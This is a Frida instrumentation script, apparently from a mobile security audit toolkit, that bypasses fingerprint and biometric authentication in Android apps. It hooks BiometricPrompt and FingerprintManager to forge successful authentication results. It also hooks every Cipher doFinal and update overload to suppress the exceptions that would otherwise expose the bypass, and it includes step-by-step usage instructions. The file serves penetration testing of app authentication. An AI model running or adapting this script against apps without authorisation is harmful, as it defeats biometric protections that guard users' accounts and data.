/****************************************************************************************************************************
 * Name: Fingerprint bypass via Exception Handling
 * OS: Android
 * Author: FSecureLABS
 * Source: https://github.com/FSecureLABS/android-keystore-audit/blob/master/frida-scripts/fingerprint-bypass-via-exception-handling.js
 * Info: 
    Fingerprint bypass via Exception Handling.
    We assume that application use CryptoObject to perform some crypto stuff in the onAuthenticationSucceeded only to confirm that fingerprint authentication (e.g. all data is encrypted using key other than this from fingerprint ).
    How to use:
    1. Attach script to application.
    1. Trigger fingerprint screen (frida should log that authenticate() method was called)
    3. run bypass() function.
*****************************************************************************************************************************/


send("Fingerprint hooks loaded!");

Java.perform(function () {

    //Call in try catch as Biometric prompt is supported since api 28 (Android 9)
    try {
        hookBiometricPrompt_authenticate();
    } catch (error) {
        send("hookBiometricPrompt_authenticate not supported on this android version")
    }
    try {
        hookBiometricPrompt_authenticate2();
    } catch (error) {
        send("hookBiometricPrompt_authenticate not supported on this android version")
    }

    //hookFingerprintManagerCompat_authenticate();
    hookFingerprintManager_authenticate();


    hookDoFinal();
    hookDoFinal2();
    hookDoFinal3();
    hookDoFinal4();
    hookDoFinal5();
    hookDoFinal6();
    hookDoFinal7();
    hookUpdate();
    hookUpdate2();
    hookUpdate3();
    hookUpdate4();
    hookUpdate5();

});



var cipherList = [];
var callbackG = null;
var authenticationResultInst = null;
var StringCls = null;
Java.perform(function () {
    StringCls = Java.use('java.lang.String');


});


function hookBiometricPrompt_authenticate() {
    var biometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt')['authenticate'].overload('android.os.CancellationSignal', 'java.util.concurrent.Executor', 'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');
    send("Hooking BiometricPrompt.authenticate()...");
    biometricPrompt.implementation = function (cancellationSignal, executor, callback) {
        send("[BiometricPrompt.BiometricPrompt()]: cancellationSignal: " + cancellationSignal + ", executor: " + ", callback: " + callback);

        var sweet_cipher = null;
        var cryptoObj = Java.use('android.hardware.biometrics.BiometricPrompt$CryptoObject');
        var cryptoInst = cryptoObj.$new(sweet_cipher);

        var authenticationResultObj = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');
        authenticationResultInst = authenticationResultObj.$new(cryptoInst, null, 0);
        send("cryptoInst:, " + cryptoInst + " class: " + cryptoInst.$className);

        callback.onAuthenticationSucceeded(authenticationResultInst);
        //return this.authenticate(cancellationSignal,executor,callback);
    }

}

function hookBiometricPrompt_authenticate2() {
    var biometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt')['authenticate'].overload('android.hardware.biometrics.BiometricPrompt$CryptoObject', 'android.os.CancellationSignal', 'java.util.concurrent.Executor', 'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');
    send("Hooking BiometricPrompt.authenticate2()...");
    biometricPrompt.implementation = function (crypto, cancellationSignal, executor, callback) {
        send("[BiometricPrompt.BiometricPrompt2()]: crypto:" + crypto + ", cancellationSignal: " + cancellationSignal + ", executor: " + ", callback: " + callback);



        var authenticationResultObj = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');
        authenticationResultInst = authenticationResultObj.$new(crypto, null, 0);
        callbackG = callback;

        //callback.onAuthenticationSucceeded(authenticationResultInst);

        return this.authenticate(crypto, cancellationSignal, executor, callback);
    }

}

function hookFingerprintManagerCompat_authenticate() {
    /*
    void authenticate (FingerprintManagerCompat.CryptoObject crypto, 
                    int flags, 
                    CancellationSignal cancel, 
                    FingerprintManagerCompat.AuthenticationCallback callback, 
                    Handler handler)
    */
    var fingerprintManagerCompat = null;
    var cryptoObj = null;
    var authenticationResultObj = null;
    try {
        fingerprintManagerCompat = Java.use('android.support.v4.hardware.fingerprint.FingerprintManagerCompat');
        cryptoObj = Java.use('android.support.v4.hardware.fingerprint.FingerprintManagerCompat$CryptoObject');
        authenticationResultObj = Java.use('android.support.v4.hardware.fingerprint.FingerprintManagerCompat$AuthenticationResult');
    } catch (error) {}
    if (fingerprintManagerCompat == null) {
        try {
            fingerprintManagerCompat = Java.use('androidx.core.hardware.fingerprint.FingerprintManagerCompat');
            cryptoObj = Java.use('androidx.core.hardware.fingerprint.FingerprintManagerCompat$CryptoObject');
            authenticationResultObj = Java.use('androidx.core.hardware.fingerprint.FingerprintManagerCompat$AuthenticationResult');
        } catch (error) {}
    }
    if (fingerprintManagerCompat == null) {
        send("FingerprintManagerCompat class not found!");
        return;
    }
    send("Hooking FingerprintManagerCompat.authenticate()...");
    var fingerprintManagerCompat_authenticate = fingerprintManagerCompat['authenticate'];
    fingerprintManagerCompat_authenticate.implementation = function (crypto, flags, cancel, callback, handler) {
        send("[FingerprintManagerCompat.authenticate()]: crypto: " + crypto + ", flags: " + flags + ", cancel:" + cancel + ", callback: " + callback + ", handler: " + handler);
        //send(enumMethods(callback.$className));
        // Hook onAuthenticationFailed
        callback['onAuthenticationFailed'].implementation = function () {
            send("[onAuthenticationFailed()]:");



        }

        authenticationResultInst = authenticationResultObj.$new(crypto, null, 0);
        callbackG = callback;

        return this.authenticate(crypto, flags, cancel, callback, handler);
    }
}

function hookFingerprintManager_authenticate() {
    /*
    public void authenticate (FingerprintManager.CryptoObject crypto, 
                    CancellationSignal cancel, 
                    int flags, 
                    FingerprintManager.AuthenticationCallback callback, 
                    Handler handler)
Error: authenticate(): has more than one overload, use .overload(<signature>) to choose from:
    .overload('android.hardware.fingerprint.FingerprintManager$CryptoObject', 'android.os.CancellationSignal', 'int', 'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback', 'android.os.Handler')
    .overload('android.hardware.fingerprint.FingerprintManager$CryptoObject', 'android.os.CancellationSignal', 'int', 'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback', 'android.os.Handler', 'int')


    */
    var fingerprintManager = null;
    var cryptoObj = null;
    var authenticationResultObj = null;
    try {
        fingerprintManager = Java.use('android.hardware.fingerprint.FingerprintManager');
        cryptoObj = Java.use('android.hardware.fingerprint.FingerprintManager$CryptoObject');
        authenticationResultObj = Java.use('android.hardware.fingerprint.FingerprintManager$AuthenticationResult');
    } catch (error) {}
    if (fingerprintManager == null) {
        try {
            fingerprintManager = Java.use('androidx.core.hardware.fingerprint.FingerprintManager');
            cryptoObj = Java.use('androidx.core.hardware.fingerprint.FingerprintManager$CryptoObject');
            authenticationResultObj = Java.use('androidx.core.hardware.fingerprint.FingerprintManager$AuthenticationResult');
        } catch (error) {}
    }
    if (fingerprintManager == null) {
        send("FingerprintManager class not found!");
        return;
    }
    send("Hooking FingerprintManager.authenticate()...");

    var fingerprintManager_authenticate = fingerprintManager['authenticate'].overload('android.hardware.fingerprint.FingerprintManager$CryptoObject', 'android.os.CancellationSignal', 'int', 'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback', 'android.os.Handler');
    fingerprintManager_authenticate.implementation = function (crypto, cancel, flags, callback, handler) {
        send("[FingerprintManager.authenticate()]: crypto: " + crypto + ", flags: " + flags + ", cancel:" + cancel + ", callback: " + callback + ", handler: " + handler);

        authenticationResultInst = authenticationResultObj.$new(crypto, null, 0);
        callbackG = callback;

        return this.authenticate(crypto, cancel, flags, callback, handler);
    }
}


function enumMethods(targetClass) {
    var hook = Java.use(targetClass);
    var ownMethods = hook.class.getDeclaredMethods();

    return ownMethods;
}



/*

Handler handler = new Handler(Looper.getMainLooper());
handler.post(new Runnable() {
     public void run() {
          // UI code goes here
     }
});
*/

function bypass() {
    Java.perform(function () {

        try {
            var Runnable = Java.use('java.lang.Runnable');
            var Runner = Java.registerClass({
                name: 'com.MWR.Runner',
                implements: [Runnable],
                methods: {
                    run: function () {
                        try {
                            callbackG.onAuthenticationSucceeded(authenticationResultInst); // we just need to call this single line (other code is needed to call this on UI thread)
                        } catch (error) {
                            send("exception catched!" + error);
                        }
                    }
                }
            });

            var Handler = Java.use('android.os.Handler');
            var Looper = Java.use('android.os.Looper');
            var loop = Looper.getMainLooper();
            var handler = Handler.$new(loop);
            handler.post(Runner.$new());

        } catch (e) {
            send("registerClass error3 >>>>>>>> " + e);
        }

    });
}

function hookDoFinal() {
    var cipherInit = Java.use('javax.crypto.Cipher')['doFinal'].overload();
    var tmp = null;
    cipherInit.implementation = function () {
        send("[Cipher.doFinal()]: " + "  cipherObj: " + this);

        try {
            tmp = this.doFinal();
        } catch (error) {
            send("exception catched! " + error);
            if ((error + "").indexOf("javax.crypto.IllegalBlockSizeException") == -1)
                throw error;
            else {
                return null;
            }
        }
        return tmp;
    }
}

function hookDoFinal2() {
    var cipherInit = Java.use('javax.crypto.Cipher')['doFinal'].overload('[B');
    var tmp = null;
    cipherInit.implementation = function (byteArr) {
        send("[Cipher.doFinal2()]: " + "  cipherObj: " + this);
        try {
            tmp = this.doFinal(byteArr);
        } catch (error) {
            send("exception catched! " + error);
            if ((error + "").indexOf("javax.crypto.IllegalBlockSizeException") == -1)
                throw error;
            else {
                return byteArr;
            }
        }
        return tmp;
    }
}

function hookDoFinal3() {
    var cipherInit = Java.use('javax.crypto.Cipher')['doFinal'].overload('[B', 'int');
    var tmp = null;
    cipherInit.implementation = function (byteArr, a1) {
        send("[Cipher.doFinal3()]: " + "  cipherObj: " + this);
        try {
            tmp = this.doFinal(byteArr, a1);
        } catch (error) {
            send("exception catched! " + error);
            if ((error + "").indexOf("javax.crypto.IllegalBlockSizeException") == -1)
                throw error;
            else {
                return 1;
            }
        }
        return tmp;
    }
}

function hookDoFinal4() {
    var cipherInit = Java.use('javax.crypto.Cipher')['doFinal'].overload('java.nio.ByteBuffer', 'java.nio.ByteBuffer');
    var tmp = null;
    cipherInit.implementation = function (a1, a2) {
        send("[Cipher.doFinal4()]: " + "  cipherObj: " + this);
        try {
            tmp = this.doFinal(a1, a2);
        } catch (error) {
            send("exception catched! " + error);
            if ((error + "").indexOf("javax.crypto.IllegalBlockSizeException") == -1)
                throw error;
            else {
                return 1;
            }

        }
        return tmp;
    }
}

function hookDoFinal5() {
    var cipherInit = Java.use('javax.crypto.Cipher')['doFinal'].overload('[B', 'int', 'int');
    var tmp = null;
    cipherInit.implementation = function (byteArr, a1, a2) {
        send("[Cipher.doFinal5()]: " + "  cipherObj: " + this);
        try {
            tmp = this.doFinal(byteArr, a1, a2);
        } catch (error) {
            send("exception catched! " + error);
            if ((error + "").indexOf("javax.crypto.IllegalBlockSizeException") == -1)
                throw error;
            else {
                return byteArr;
            }
        }
        return tmp;
    }
}

function hookDoFinal6() {
    var cipherInit = Java.use('javax.crypto.Cipher')['doFinal'].overload('[B', 'int', 'int', '[B');
    var tmp = null;
    cipherInit.implementation = function (byteArr, a1, a2, outputArr) {
        send("[Cipher.doFinal6()]: " + "  cipherObj: " + this);
        try {
            tmp = this.doFinal(byteArr, a1, a2, outputArr);
        } catch (error) {
            send("exception catched! " + error);
            if ((error + "").indexOf("javax.crypto.IllegalBlockSizeException") == -1)
                throw error;
            else {
                return 1;
            }
        }

        return tmp;
    }
}

function hookDoFinal7() {
    var cipherInit = Java.use('javax.crypto.Cipher')['doFinal'].overload('[B', 'int', 'int', '[B', 'int');
    var tmp = null;
    cipherInit.implementation = function (byteArr, a1, a2, outputArr, a4) {
        send("[Cipher.doFinal7()]: " + "  cipherObj: " + this);
        try {
            tmp = this.doFinal(byteArr, a1, a2, outputArr, a4);
        } catch (error) {
            send("exception catched! " + error);
            if ((error + "").indexOf("javax.crypto.IllegalBlockSizeException") == -1)
                throw error;
            else {
                return 1;
            }
        }

        return tmp;
    }
}

/*
    .overload('[B')
    .overload('java.nio.ByteBuffer', 'java.nio.ByteBuffer')
    .overload('[B', 'int', 'int')
    .overload('[B', 'int', 'int', '[B')
    .overload('[B', 'int', 'int', '[B', 'int')
*/
function hookUpdate() {
    var cipherInit = Java.use('javax.crypto.Cipher')['update'].overload('[B');
    var tmp = null;
    cipherInit.implementation = function (byteArr) {
        send("[Cipher.update()]: " + "  cipherObj: " + this);
        try {
            tmp = this.update(byteArr);
        } catch (error) {
            send("exception catched! " + error);
            if ((error + "").indexOf("javax.crypto.IllegalBlockSizeException") == -1)
                throw error;
            else {
                return byteArr;
            }
        }
        return tmp;
    }
}

function hookUpdate2() {
    var cipherInit = Java.use('javax.crypto.Cipher')['update'].overload('java.nio.ByteBuffer', 'java.nio.ByteBuffer');
    var tmp = null;
    cipherInit.implementation = function (byteArr, outputArr) {
        send("[Cipher.update2()]: " + "  cipherObj: " + this);
        try {
            tmp = this.update(byteArr, outputArr);
        } catch (error) {
            send("exception catched! " + error);
            if ((error + "").indexOf("javax.crypto.IllegalBlockSizeException") == -1)
                throw error;
            else {
                return 1;
            }
        }
        return tmp;
    }
}

function hookUpdate3() {
    var cipherInit = Java.use('javax.crypto.Cipher')['update'].overload('[B', 'int', 'int');
    var tmp = null;
    cipherInit.implementation = function (byteArr, a1, a2) {
        send("[Cipher.update3()]: " + "  cipherObj: " + this);
        try {
            tmp = this.update(byteArr, a1, a2);
        } catch (error) {
            send("exception catched! " + error);
            if ((error + "").indexOf("javax.crypto.IllegalBlockSizeException") == -1)
                throw error;
            else {
                return byteArr;
            }
        }
        return tmp;
    }
}

function hookUpdate4() {
    var cipherInit = Java.use('javax.crypto.Cipher')['update'].overload('[B', 'int', 'int', '[B');
    var tmp = null;
    cipherInit.implementation = function (byteArr, a1, a2, outputArr) {
        send("[Cipher.update4()]: " + "  cipherObj: " + this);
        try {
            tmp = this.update(byteArr, a1, a2, outputArr);
        } catch (error) {
            send("exception catched! " + error);
            if ((error + "").indexOf("javax.crypto.IllegalBlockSizeException") == -1)
                throw error;
            else {
                return 1;
            }
        }
        return tmp;
    }
}

function hookUpdate5() {
    var cipherInit = Java.use('javax.crypto.Cipher')['update'].overload('[B', 'int', 'int', '[B', 'int');
    var tmp = null;
    cipherInit.implementation = function (byteArr, a1, a2, outputArr, a4) {
        send("[Cipher.update5()]: " + "  cipherObj: " + this);
        try {
            tmp = this.update(byteArr, a1, a2, outputArr, a4);
        } catch (error) {
            send("exception catched! " + error);
            if ((error + "").indexOf("javax.crypto.IllegalBlockSizeException") == -1)
                throw error;
            else {
                return 1;
            }
        }
        return tmp;
    }
}